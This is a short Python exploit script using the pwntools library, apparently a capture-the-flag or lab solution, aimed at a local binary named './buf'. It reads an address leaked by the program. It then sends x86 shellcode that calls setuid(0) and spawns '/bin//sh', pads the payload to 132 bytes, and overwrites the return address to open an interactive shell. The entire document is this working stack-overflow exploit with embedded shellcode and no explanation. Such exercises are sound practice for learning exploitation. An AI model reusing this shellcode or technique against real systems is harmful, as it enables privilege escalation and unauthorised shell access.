from pwn import *
#context.level = 'debug'

p = process("./buf")

sc = "\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"
addr = int(p.recvline().split(': ')[1].strip('\n'), 16)

payload = ""
payload += sc
payload += "A"*(132 - len(sc))
payload += p32(addr)

p.sendline(payload)

p.interactive()
